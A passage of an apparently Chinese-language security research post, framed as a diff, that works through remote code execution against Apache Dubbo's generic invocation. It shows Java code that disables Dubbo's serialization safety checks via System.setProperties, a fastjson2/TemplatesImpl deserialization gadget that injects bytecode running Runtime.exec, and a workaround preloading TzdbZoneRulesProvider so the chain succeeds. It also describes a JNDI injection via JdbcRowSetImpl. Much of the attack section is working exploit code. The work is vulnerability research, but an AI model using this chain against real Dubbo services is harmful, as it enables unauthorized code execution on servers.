@@ -1,0 +1,103 @@
+        return map3;
+    }
+第一个newChecker，用于创建一个OPEN_CHECK_CLASS属性值为false的SerializeClassChecker的对象，第二个map，用于将newChecker传入到SerializeClassChecker的单例INSTACNE属性中。然后第三个map2，使用类似CVE-2021-30179的POC，创建一个com.sun.rowset.JdbcRowSetImpl对象，然后dubbo会先后调用setDataSourceName和setAutoCommit，从而向我们指定的地址发起JNDI请求。需要注意这里map2需要设置为LinkedHashMap，否则在dubbo进行set调用时可能无法按照先setDataSourceName，再setAutoCommit的顺序执行。
+## 利用方式2
+利用object.set+METHOD_NAME进行利用。
+dubbo在泛化调用的过程中是存在一个接口允许原生java反序列化的。但是这个接口默认不开启，同时会进行序列化的黑名单类检查。然而这个接口调用开关是可以被控制的，我们如果可以把它打开，那么这个漏洞就变成了一个原生的java反序列化漏洞，利用特定的gadget就可以RCE。在中，师傅提到了可以使用`org.apache.dubbo.common.utils.ConfigUtils`类，它存在一个setProperties方法，可以对`PROPERTIES`对象进行赋值，从而控制开关。但是我发现`org.apache.dubbo.common.utils.ConfigUtils`的setProperties方法只在2.7.x版本的dubbo存在，3.0.x和3.1.x都是没有的。那有没有什么通用的方法呢？事实上，Dubbo的configuration也是可以通过java.lang.System类的props对象进行传入的。那么就可以直接调用System.setProperties方法，传入修改后的dubbo配置。代码如下：
+    private static Map getProperties() throws IOException {
+        Properties properties = new Properties();
+        properties.setProperty("dubbo.security.serialize.generic.native-java-enable","true");
+        properties.setProperty("serialization.security.check","false");
+        HashMap map = new HashMap();
+        map.put("class", "java.lang.System");
+        map.put("properties", properties);
+        return map;
+    }
+在这之后就可以使用类似如下的代码进行原生反序列化利用
+    out.writeObject(getEvilObject());
+    HashMap attachments = new HashMap();
+    attachments.put("generic", "nativejava");
+    out.writeObject(attachments);
+# 进一步拓展
+上述两种方法，在公开的分析文章里，都存在着一些问题。方法1中最终的Sink点是JNDI注入，需要出网。方法2中最终需要依赖特定的Gadget，在之前的Dubbo的反序列化分析文章中，大家在Gadget选择时都会使用一些三方依赖进行漏洞利用，例如Rome、CommonsBeanutils1等。那Dubbo是否存在原生的Java反序列化链呢？
+在Dubbo
+3.1.x的版本中，新增了对Fastjson2的支持。恰好前段时间刚好看到有师傅发了[fastjson库在原生Java反序列化中的利用](https://paper.seebug.org/2055/#fastjson1
+"fastjson库在原生Java反序列化中的利用")。结论是fastjons小于1.2.48版本是可以使用，fastjson2全版本是通杀的。利用的原理是fastjson的JSONArray或者JSONObject在调用其toString方法时，会触发其包裹对象的get+METHOD_NAME方法。因此很容易想到可以包裹一个TemplatesImpl对象，通过调用其getOutputProperties方法，从而执行任意代码。
+既然已经有了方法，那实现一下试试吧。关键代码如下：
+    public static Map getProperties() throws IOException {
+        Properties properties = new Properties();
+        properties.setProperty("dubbo.security.serialize.generic.native-java-enable","true");
+        properties.setProperty("serialization.security.check","false");
+        HashMap map = new HashMap();
+        map.put("class", "java.lang.System");
+        map.put("properties", properties);
+        return map;
+    }
+    public static Object getObject() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{},
+                clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
+        clazz.addConstructor(constructor);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, "_bytecodes", bytes);
+        setValue(templates, "_name", "test");
+        setValue(templates, "_tfactory", null);
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templates);
+        BadAttributeValueExpException val = new
+                BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, jsonArray);
+        NativeJavaSerialization nativeJavaSerialization =new NativeJavaSerialization();
+        UnsafeByteArrayOutputStream unsafeByteArrayOutputStream = new UnsafeByteArrayOutputStream();
+        ObjectOutput o = nativeJavaSerialization.serialize(null,unsafeByteArrayOutputStream);
+        o.writeObject(val);
+        return unsafeByteArrayOutputStream.toByteArray();
+    }
+    send(getProperties());
+    send(getObject());
+程序先通过System.setProperties修改目标的序列化配置，然后再发送恶意的序列化代码，指定目标执行一个Calc.exe程序。结果程序报错了，报错如下：
+程序最前面和预期的一样，成功执行了Java原生反序列化，但是在反序列化的过程中，fastjson2的JSONWriter\$Context的类初始化时，在TzdbZoneRulesProvider的构造函数中报错了，其构造函数如下：
+    public TzdbZoneRulesProvider() {
+        try {
+            String libDir = System.getProperty("java.home") + File.separator + "lib";
+            try (DataInputStream dis = new DataInputStream(
+                     new BufferedInputStream(new FileInputStream(
+                         new File(libDir, "tzdb.dat"))))) {
+                load(dis);
+            }
+        } catch (Exception ex) {
+            throw new ZoneRulesException("Unable to load TZDB time-zone rules", ex);
+        }
+    }
+可以看到，这个构造函数中会调用System.getProperty("java.home")，拼接进文件读取路径，从而去读取jre路径下的tzdb.dat，这是一个IANA提供的TimeZone数据库，维护着最新最全的全球时区相关基础数据。由于我们在反序列化前替换掉了目标服务的System类的props对象，因此，这里System.getProperty("java.home")就会返回null，从而导致报错。
+这个问题如何解决呢？通过观察调用链，以及动态调试，我找到了解决方法。通过在TzdbZoneRulesProvider类的构造函数打断点。
+注意到TzdbZoneRulesProvider的初始化是被ZoneRulesProvider的类初始化调用的。ZoneRulesProvider的相关代码如下：
+可以看到在ZoneRulesProvider类的static代码块中调用的new
+TzdbZoneRulesProvider()。static块的代码在程序被运行起来后，之后最多加载一次。因此如果可以让这个ZoneRulesProvider类在我们执行攻击前被加载一次，那么我们在执行攻击时就不会再加载这块代码，也就不会报错了。
+有了这个方法，第一时间就想到，dubbo
+的泛化调用可以初始化并newIntance类，并且TzdbZoneRulesProvider是ZoneRulesProvider的子类，ZoneRulesProvider在newIntance时初始化其弗雷，从而调用传ZoneRulesProvider类的static代码。基于这个想法，构造如下代码：
+    private static Map getInstance() throws IOException {
+        HashMap map = new HashMap();
+        map.put("class", "java.time.zone.TzdbZoneRulesProvider");
+        return map;
+    }
+    private static Map getProperties() throws IOException {
+        Properties properties = new Properties();
+        properties.setProperty("dubbo.security.serialize.generic.native-java-enable","true");
+        properties.setProperty("serialization.security.check","false");
+        HashMap map = new HashMap();
+        map.put("class", "java.lang.System");
+        map.put("properties", properties);
+        return map;
+    }
+分成两步发送，最后发送序列化poc，即可完成代码执行。
+# 参考链接
+  * 
+  * 
